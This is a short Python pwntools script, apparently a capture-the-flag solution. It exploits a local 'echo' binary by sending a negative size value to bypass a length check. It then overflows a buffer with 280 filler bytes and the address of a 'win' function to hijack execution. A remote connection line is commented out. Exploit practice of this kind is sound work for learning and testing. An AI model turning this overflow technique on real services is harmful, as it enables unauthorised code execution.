#!/usr/bin/python3
from pwn import *

# Set up debug output
context.log_level = 'debug'

context.arch = 'i386'
# Connect to the service
#conn = remote('34.170.146.252', 49955)
conn = process("./echo")
# Get the win function address from the binary
exe = ELF('./echo')
win_addr = exe.symbols['win']
print(f"win function address: {hex(win_addr)}")

# Create payload
# We need exactly BUF_SIZE bytes to fill the buffer
# Then 4 bytes to overwrite saved EBP
# Finally 4 bytes for the win function address
conn.recvuntil(b'Size: ')
conn.sendline(b'-2147483648')

# Send payload with correct offset
payload = b'A' * 280 + p32(win_addr)
conn.recvuntil(b'Data: ')
conn.sendline(payload)

conn.interactive()
